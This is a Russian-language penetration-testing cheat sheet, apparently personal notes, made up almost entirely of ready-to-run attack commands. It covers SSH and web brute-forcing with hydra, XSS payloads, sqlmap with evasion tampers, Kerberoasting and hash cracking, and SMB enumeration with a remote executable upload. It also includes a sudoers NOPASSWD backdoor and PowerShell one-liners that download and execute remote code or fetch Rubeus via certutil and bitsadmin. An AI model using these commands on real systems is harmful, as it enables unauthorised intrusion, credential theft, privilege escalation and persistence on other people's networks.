Скрипты автоматизации
====
## SSH
Проблема подключения putty к SSH через ключ

```
echo ‘PubkeyAcceptedAlgorithms +ssh-rsa’ >> /etc/ssh/sshd_config
```
Перебор паролей:

```
hydra -V -f -t 4 -l root -P pass.txt ssh://172.16.60.1
```

```
nmap -p22 --script=ssh-brute --script-args userdb=users.txt,passdb=pass.txt 172.16.60.1
```


## Веб
Методология OWASP

1. сбор информации (Краулинг) nmap, dnscan, google, whatweb, burp spider
2. тестирование конфигурации (dirbuster, http method, )
3. тестирование механизмов идентификации (burp+secList)
4. тестирование механизмов аутентификации (Recovery)
5. тестирование механизмов авторизации (DirTraversal, Id Inc, FileBrute)
6. тестирование механизмов управления сессиями (Cookie, CSRF)
7. тестирование валидации входных данных (XSS, SQLi, XML, LDAP, XPATH, HTTP-Splitting)
8. тестирование обработки ошибок (ERROR handle)
9. тестирование на предмет некриптостойкого шифрования (SSL/TLS)
10. тестирование бизнес-логики приложения (Валидация данных, бизнес-логики, загрузка данных)
11. тестирование механизмов безопасности клиентской части(XSS,JavaScript-инъекции, Clickjacking, WebSockets;)

***Межсайтовый скриптинг:***

```
"><img src=# onerror="alert(xss)">
"><script>alert(1)</script>
<img src=x onerror=alert(1)/>
<svg onload=alert('XSS')>
1"--><svg/onload=';alert(0);'>

```
***Набор данных для фаззинга:***

https://github.com/Bo0oM/fuzz.txt
https://github.com/danielmiessler/SecLists

***Sqlmap***
```
sqlmap -r target1 --dbms=mssql --all --hex --tamper=space2comment,between,charencode --level=5 --risk=3
```

***Basic брут***
```
hydra -L tomcat_user.txt -P tomcat_pass.txt -f alic.trust.localhost -s 7012 http-get /manager/html
```
***Брут битрксового хеша***
```
hashcat -a 0 -m 20 pass.txt /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000.txt
```

## Python   
Проблема установки пакетов pip в корпоративной среде, варианты решения:
1. export HTTPS_PROXY=https://172.16.70.1:8888/ && export HTTP_PROXY=http://172.16.70.1:8888/ или set HTTPS_PROXY=https://172.16.70.1:8888/  && set HTTP_PROXY=http://172.16.70.1:8888/
2. pip3 install GitPython --proxy="https://172.16.70.1:8888" --global http.sslVerify false --trusted-host 172.16.70.1 --trusted-host pypi.org --trusted-host files.pythonhosted.org --trusted-host 172.16.70.1
3. pip install --index-url https://user:pass@nexus.company.local/repository/Python-group/simple GitPython


## Повышение привилегий

**Linux** 

pwnkit --  https://github.com/PwnFunction/CVE-2021-4034 
```
adduser user
usermod -aG user sudo
echo 'user ALL=NOPASSWD: ALL' >> /etc/sudoers
```

## Active Directory

Как получить учётную запись в AD:
[  ] Прослушивание траффика
[  ] Password spray
[  ] LLNR, WPAD, spoof responder
[  ] Ipv6 attack mitm6
[  ] Mitm + DNS fake+ Portal fake = intercepter-ng
[  ] Поиск общедоступных шар crakmapexec, WinGrep
[  ] Поиск серверов с уязвимостью
[  ] Wiki, confluence, jira


**Поиск Gpp** 
```
findstr /S /I cpassword \\domain.trust.localhost\sysvol\vestik\policies\*.xml
```
**SPN учетки** 
```
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -dc-ip 172.16.1.1 trust.localhost/ptuser -request
[W] Get-NetUser -SPN -Server srv1.trust.localhost -Credential $cred | select serviceprincipalname
[L] ldapsearch -LLL -x -H ldap://172.16.1.1 -D "capitan@trust.localhost" -W -b "dc=trust,dc=localhost" "servicePrincipalName=*" sAMAccountName servicePrincipalName
hashcat -m 13100 --force <TGSs_file> <passwords_file>
for i in $(find -name '*.txt'); do hashcat -m 13100 --force tgt_ticket.txt "$i"; done >> /tmp/brute_tgt.log
```


## SMB
Шары

```
smbmap -u shut -p nik123 -H alloc.trust.localhost -d trust.localhost (-q -R --depth 5 -A 'passw' --exclude ADMIN$ IPC$ C$ --host-file hosts.txt)
crackmapexec smb inv1.trust.localhost -u shut -p nik123 -d trust.localhost --put-file k1.exe  \\k1.exe
wmic /node:alloc.trust.localhost /user:'trust.localhost\shut' /password:nik123 share list \\172.16.1.1
enum4linux -a -u shut -p nik123 -w trust.localhost alloc.trust.localhost
```

Монтирование шары:
```
sudo apt install cifs-utils && sudo mkdir /mnt/win_share && sudo mount -t cifs -o username=shut //nas.trust.localhost/WORK/logs /mnt/win_share
```

## Получить хеш файла
Windows
```
Echo 'Certutil -hashfile %1 MD5' >>C:\md5.bat
```
Linux
```
 md5sum ex.xml
```

## OpenVPN

***Генерируем статические ключи***
```
openvpn --genkey --secret static.key
```

***Конфигурация сервера***
```
dev tun
ifconfig 172.27.0.1 172.27.0.2 #Сервер клиент
secret static.key
proto tcp-server
port 443
```

***Конфигурация клиента***

```
dev tun
remote 192.168.1.110
port 443
proto tcp-client
ifconfig 172.27.0.2 172.27.0.1 #клиент Сервер
route 172.27.1.0 255.255.255.0 172.27.0.1
route 10.1.1.0 255.255.255.0 172.27.0.1
cipher AES-256-CBC
secret D:\\vlab\\static.key
script-security 2                                                                                                       
dhcp-option DNS 172.16.1.1                                                                                           
dhcp-option DOMAIN trust.localhost
```

## PowerShell && Передача файлов

Скачать
```
powershell "IEX(New-Object Net.WebClient).downloadString('http://nur1.files.kz/robots.txt')"
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://nur1.files.kz/robots.txt')|iex"
smbmap -u vboxuser -p Qwerty123 -H 172.16.1.1 -x 'certutil.exe -urlcache -f  http://172.16.1.3:8888/Rubeus.exe Rubeus.exe'
bitsadmin /transfer myDownloadJob /download /priority normal http://172.16.1.3:8888/Rubeus.exe c:\Rubeus.exe
```

## RDP

```
rdp_check <domain>/<name>:<password>@<IP>
xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.186.81 /u:'Administrator' /p:'Password321'
```
